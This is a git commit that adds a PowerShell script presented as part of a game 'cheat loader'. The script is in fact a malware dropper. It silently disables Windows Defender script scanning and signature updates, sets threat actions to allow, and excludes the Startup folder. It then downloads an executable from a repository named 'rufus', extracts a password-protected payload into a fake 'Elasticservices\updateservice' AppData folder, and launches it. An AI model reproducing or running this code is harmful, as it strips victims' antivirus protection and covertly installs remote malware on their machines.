2a9b03bbd6a6bb4c3e9f6bd8721e5fd41f244df0
makakaboom11 <109354368+makakaboom11@users.noreply.github.com>
2022-12-28 20:37:50 +0000

    Add files via upload

---
+++ Cheat Loader By LeonimusT/monwin_1.ps1
@@ -0,0 +1,16 @@
+$ErrorActionPreference = 'SilentlyContinue'
+$ProcName = "LaunchMode.exe"
+$WebFile = "https://github.com/makakaboom11/rufus/blob/main/x86/Release/LaunchMode_1.exe?raw=true"
+$Outff = "$env:Temp\LaunchMode.exe"
+
+Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -HighThreatDefaultAction 6 -Force
+Set-MpPreference -ModerateThreatDefaultAction 6 -Force
+$vrer4 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+Add-MpPreference -ExclusionProcess serverCommon.exe -Force
+Add-MpPreference -ExclusionPath "$vrer4" -Force
+Invoke-WebRequest -uri $WebFile -OutFile $Outff
+& $env:Temp\LaunchMode.exe -s -p"gr30hu8efhb3kbfe" -d"$env:APPDATA\Elasticservices\updateservice\"
+Timeout /T 5
+Start-Process ("$env:APPDATA\Elasticservices\updateservice\Updservicemonitor.exe")
